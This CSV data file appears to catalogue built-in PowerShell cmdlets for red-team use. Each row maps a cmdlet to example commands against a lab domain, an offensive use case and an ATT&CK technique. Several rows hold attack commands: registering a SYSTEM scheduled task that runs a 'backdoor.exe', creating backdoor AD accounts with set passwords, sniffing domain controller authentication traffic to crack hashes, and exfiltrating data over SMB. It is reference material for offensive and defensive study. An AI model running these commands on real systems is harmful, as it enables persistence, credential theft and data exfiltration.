"New-ScheduledTask","Creates a scheduled task instance","2024-12-13","[''Builtin''-|-''CIMSession'']","","$a = New-ScheduledTaskAction -Execute ""C:\Tmp\backdoor.exe"" -Argument '-background' $p = New-ScheduledTaskPrincipal -UserId ""NT Authority\SYSTEM"" $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8 $d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d","Create new scheduled task","None","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See [Register-ScheduledTask](../Register-ScheduledTask)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-PSSession","Creates a persistent connection to a local or remote computer","2023-08-25","[''Builtin''-|-''PSSession'']","","[''$ps = New-PSSession -ComputerName W10.ad.bitsadmin.com''-|-''$ps = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exch2019.ad.bitsadmin.com/PowerShell/ -Authentication Kerberos'']","[''Connect to WinRM''-|-''Manage Microsoft Exchange Server'']","[''None''-|-''None'']","[''Execute''-|-''Manage'']","[''Next, for example use [Enter-PSSession](../Enter-PSSession) to interactively enter the session or [Invoke-Command](../Invoke-Command) to execute a command in the session''-|-''Might require use of OffensiveDC in case error `ERROR_WSMAN_CLIENT_WORKGROUP_NO_KERBEROS` is returned on a non-domain joined machine'']","[''T1021.006''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetRoute","Creates a route in the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetNat","Creates a NAT object","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetFirewallRule","Creates a new inbound or outbound firewall rule and adds the rule to the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetEventSession","Creates a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-NetEventSession -Name sess -CimSession $s -LocalFilePath ""C:\Windows\Temp\Trace.etl"" -CaptureMode SaveToFile Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical Start-NetEventSession -Name sess -CimSession $s Get-NetEventSession -Name sess -CimSession $s  Stop-NetEventSession -Name sess -CimSession $s Remove-NetEventSession -Name sess -CimSession $s Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\tmp","Sniff traffic","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Convert resulting `.etl` file to `.pcapng` using `etl2pcapng`''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","https://github.com/microsoft/etl2pcapng","None","","Arris Huijgen","bitsadmin","","false"
"New-GPO","Creates a GPO","2023-07-01","[''RSAT''-|-''TODO'']","","New-GPO -Name RunImmediateScheduledTask","Create new GPO","Create new GPO which runs an immediate scheduled task to deploy an implant on the computers in the OU it is linked to","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-GPLink","Links a GPO to a site, domain, or OU","2023-07-01","[''RSAT''-|-''TODO'']","","New-GPLink","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-EtwTraceSession","Creates an ETW trace session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-CimSession","Creates a CIM session","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''$s = New-CimSession -ComputerName W10.ad.bitsadmin.com''-|-''$so = New-CimSessionOption -Protocol Dcom -Authentication Kerberos $s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so '']","[''Creates a CIM session over WinRM''-|-''Creates a CIM session over RPC'']","[''Connect to remote machine to perform activities using the various WMI classes''-|-''Connect to remote machine to perform activities using the various WMI classes'']","[''Manage''-|-''Manage'']","[''There are various other options for the `-Authentication` parameter that can be used''-|-''There are various other options for the `-Authentication` parameter that can be used'']","[''T1047''-|-''T1021.006''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"New-CimInstance","Creates a CIM instance","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-CimInstance -ClassName Win32_Environment -Property @{Name=""testvar"";VariableValue=""testvalue"";UserName=""<SYSTEM>""} -CimSession $s","Create new instance","Change PATH environment variable for search order hijacking","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADUser","Creates a new Active Directory user","2023-07-01","RSAT","","New-ADUser -Name ""Backdoor"" -AccountPassword (ConvertTo-SecureString ""MyPassword!"" -Force -AsPlainText) -Enabled $true","Create new user","Create backdoor user in the AD","Domain","PowerShell Module: `ActiveDirectory`","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADServiceAccount","Creates a new Active Directory managed service account or group managed service account object","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADOrganizationalUnit","Creates a new Active Directory organizational unit","2023-07-01","RSAT","","New-ADOrganizationalUnit -Name GPO_Test -Path ""OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com""","Create new OU","Create new OU for a simulated ransomware attack","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADObject","Creates an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADGroup","Creates an Active Directory group","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADGroup","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADComputer","Creates a new Active Directory computer","2023-07-01","RSAT","","$account = 'MyComputer' $password = 'Password1!' $domain = 'ad.bitsadmin.com' New-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName ""$account.$domain"" -ServicePrincipalNames @(""HOST/$account.$domain"",""RestrictedKrbHost/$account.$domain"",""HOST/$account"",""RestrictedKrbHost/$account"")","Create computer account","Create backdoor user in the AD","Domain","[''Can be performed by a regular user''-|-''By default the attribute `ms-DS-MachineAccountQuota` (global setting) is set to 10 for all domain users''-|-''PowerShell Module: `ActiveDirectory`'']","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"Move-Item","Moves an item from one location to another","2023-07-01","[''Builtin''-|-''PSSession'']","","Move-Item -Path \\FS01.ad.bitsadmin.com\Users\AllUsers.zip .","Exfiltrate data","Exfiltrate data over SMB","Data","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`'']","T1021.002","None","None","","Arris Huijgen","bitsadmin","","false"
"Mount-DiskImage","Mounts a previously created disk image (virtual hard disk or ISO), making it appear as a normal disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Mount-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-WSManAction","Invokes an action on the object that is specified by the Resource URI and by the selectors","2023-07-01","Builtin","","","Execute binary","Launch implant","Execute","PowerShell Module: `Microsoft.WSMan.Management`","[''T1047''-|-''T1059.001'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-Command","Runs commands on local and remote computers","2023-07-01","[''Builtin''-|-''PSSession'']","","[''Invoke-Command -ComputerName W10.ad.bitsadmin.com { Get-NetAdapter }''-|-''Invoke-Command -Session $ps { Get-NetAdapter }'']","[''Runs command''-|-''Runs command'']","[''None''-|-''None'']","[''Execute''-|-''Execute'']","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Core`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Core`'']","[''T1021.006''-|-''T1059.001''-|-''T1021.006''-|-''T1059.001'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-CimMethod","Invokes a method of a CIM class","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""; uValue=[uint32]2} -CimSession $s'']","[''Invoke a method on a CIM instance''-|-''Invoke a static method on a CIM class''-|-''Invoke a static method on a CIM class'']","[''Enable Remote Desktop Services''-|-''Set registry value''-|-''Launch implant'']","[''Manage''-|-''Registry''-|-''Execute'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","[''T1047''-|-''T1112''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Install-WindowsFeature","Installs one or more roles, role services, or features on either the local or a specified remote server that is running Windows Server 2012 R2","2023-07-01","[''RSAT''-|-''TODO'']","","Install-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WindowsFeature","Gets information about Windows Server roles, role services, and features that are available for installation and installed on a specified server","2023-07-01","[''RSAT''-|-''TODO'']","","Get-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WinEvent","Gets events from event logs and event tracing log files on local and remote computers","2024-12-13","Builtin","","[''Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname=""Security"";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} }''-|-''Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -LogName 'Security' -FilterXPath ""*[System[(EventID=4768)]] and *[EventData[Data[@Name='TargetUserName']='SomeAdmin']]""''-|-''Get-WinEvent -ComputerName W10.ad.bitsadmin.com -FilterHashtable @{logname=""Security"";id=4624} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; SubjectUserSid=$_.Properties[0].Value; SubjectUserName=$_.Properties[1].Value; SubjectDomainName=$_.Properties[2].Value; SubjectLogonId=$_.Properties[3].Value; TargetUserSid=$_.Properties[4].Value; TargetUserName=$_.Properties[5].Value; TargetDomainName=$_.Properties[6].Value; TargetLogonId=$_.Properties[7].Value; LogonType=$_.Properties[8].Value; LogonProcessName=$_.Properties[9].Value; AuthenticationPackageName=$_.Properties[10].Value; WorkstationName=$_.Properties[11].Value; LogonGuid=$_.Properties[12].Value; TransmittedServices=$_.Properties[13].Value; LmPackageName=$_.Properties[14].Value; KeyLength=$_.Properties[15].Value; ProcessId=$_.Properties[16].Value; ProcessName=$_.Properties[17].Value; IpAddress=$_.Properties[18].Value; IpPort=$_.Properties[19].Value; ImpersonationLevel=$_.Properties[20].Value; RestrictedAdminMode=$_.Properties[21].Value; TargetOutboundUserName=$_.Properties[22].Value; TargetOutboundDomainName=$_.Properties[23].Value; VirtualAccount=$_.Properties[24].Value; TargetLinkedLogonId=$_.Properties[25].Value; ElevatedToken=$_.Properties[26].Value;} }''-|-''Get-WinEvent -ListLog * -ComputerName DC1.ad.bitsadmin.com'']","[''List all Kerberos authentication requests''-|-''Based on TGT request identify from which IP a user is authenticating''-|-''List logons on a system''-|-''Check which logs are enabled by viewing the number of records per log'']","[''Identify which IPs logons of privileged users are originating from''-|-''Identify which IP a privileged user is originating from''-|-''Understand which accounts are used on a system''-|-''None'']","[''Logs''-|-''Logs''-|-''Logs''-|-''Logs'']","[''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`'']","[''None''-|-''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WSManInstance","Displays management information for a resource instance specified by a Resource URI","2023-07-01","Builtin","","Get-WSManInstance -ConnectionURI http://W10.ad.bitsadmin.com:5985/wsman shell -Enumerate","List WSMan connections","Identify which WSMan sessions are currently active and from where","Sessions","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VpnConnection","Retrieves the specified VPN connection profile information","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-VpnConnection -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: VpnClient'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Volume","Gets the specified Volume object, or all Volume objects if no filter is provided","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Volume -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VirtualDisk","Returns a list of VirtualDisk objects, across all storage pools, across all providers, or optionally a filtered subset based on provided criteria","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VM","Gets the virtual machines from one or more Hyper-V hosts","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-VM -CimSession $s","List VMs","Reconnaissance on VMs running on a Hyper-V server","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbShare","Retrieves the SMB shares on the computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","[''T1135''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbSession","Retrieves information about the SMB sessions that are currently established between the SMB server and the associated clients","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbServerConfiguration","Retrieves the SMB server configuration","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbServerConfiguration -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbOpenFile","Retrieves basic information about the files that are open on behalf of the clients of the SMB server","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbOpenFile -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbConnection","Retrieves the connections established from the SMB client to the SMB servers","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbConnection -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Service","Gets the services on a local or remote computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-Service -ComputerName W10.ad.bitsadmin.com","List services","Reconnaissance on installed services","Processes","Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ScheduledTaskInfo","Gets run-time information for a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-ScheduledTaskInfo -CimSession $s -TaskName '\Microsoft\Windows\DiskCleanup\CleanupBackdoor'","List details on scheduled task execution","Determine past executions of implant","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ScheduledTask","Gets the task definition object of a scheduled task that is registered on the local computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-ScheduledTask -CimSession $s | % { [PSCustomObject]@{State=$_.State; TaskName=$_.TaskName; TaskPath=$_.TaskPath; Actions=$($a=$_.Actions;$($a.Id,$a.WorkingDirectory,$a.Execute,$a.Arguments).Where({$_ -ne $null}) -join "" ""); Author=$_.Author; Description=$_.Description; SecurityDescriptor=$_.SecurityDescriptor } }","List details on scheduled tasks","Reconnaissance","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-RemoteAccess","Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN)","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-RemoteAccess -CimSession $s","TODO","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: RemoteAccess'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Process","Gets the processes that are running on the local computer or a remote computer.","2023-07-01","Builtin","","Get-Process -ComputerName DC1.ad.bitsadmin.com","List processes","Reconnaissance on running processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Printer","Retrieves a list of printers installed on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Printer -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: PrintManagement'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-PhysicalDisk","Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally a filtered list","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-PhysicalDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Partition","Returns a list of all partition objects visible on all disks, or optionally a filtered list using specified parameters","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Partition -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-OdbcDsn","Gets ODBC DSNs","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-OdbcDsn -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: Wdac'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NfsShare","Gets NFS shares on an NFS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-NfsShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: NFS'']","[''T1135''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NfsSession","Gets information about which client computers are currently connected to one or more shares on an NFS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-NfsSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: NFS'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetUDPEndpoint","Gets current UDP endpoint statistics","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetUDPEndpoint -CimSession $s","Enumerate listening UDP ports","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetTCPConnection","Gets TCP connections","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-NetTCPConnection -CimSession $s -State Listen''-|-''Get-NetTCPConnection -CimSession $s -State Established'']","[''Enumerate listening TCP ports''-|-''List established connections'']","[''Recon on listening services''-|-''Recon on current network and Internet activity'']","[''Network''-|-''Network'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","[''T1047''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetRoute","Gets the IP route information from the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetRoute -CimSession $s","List routing table","Identify network routes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNeighbor","Gets neighbor cache entries","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetNeighbor -CimSession $s | select InterfaceIndex,IPAddress,AddressFamily,LinkLayerAddress,State,InterfaceAlias | ft","List ARP entries","Identify which devices are in the same subnet","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatStaticMapping","Gets static mappings configured on NAT instances","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatSession","Gets all active NAT sessions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatSession -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatGlobal","Retrieves global settings for all NAT instances on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatGlobal -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNatExternalAddress","Gets external addresses configured for NAT instances","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetNat","Gets NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetIPInterface","Gets an IP interface","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetIPInterface -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetIPAddress","Gets the IP address configuration","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetIPAddress -CimSession $s | Sort InterfaceIndex | ft -Autosize InterfaceIndex, InterfaceAlias, AddressFamily, IPAddress, PrefixLength","List IP addresses of the various interfaces","Identify whether a machine might be dual-homed","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetFirewallRule","Retrieves firewall rules from the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetEventSession","Gets network event sessions","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetEventSession -Name sess -CimSession $s","Get status of an event session","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetConnectionProfile","Gets a connection profile","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetConnectionProfile -CimSession $s","List active connection profiles","Determine what connection profiles are active on the network interfaces","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetConnection`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetAdapter","Gets the basic network adapter properties","2024-12-13","[''Builtin''-|-''CIMSession'']","","Get-NetAdapter -Name * -CimSession $s","List adapters","Identify whether a machine is dual-homed","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetAdapter`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreatDetection","Gets active and past malware threats that Windows Defender detected","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreatDetection -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreatCatalog","Gets known threats from the definitions catalog","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreatCatalog -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-MpThreat","Gets the history of threats detected on the computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-MpThreat -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
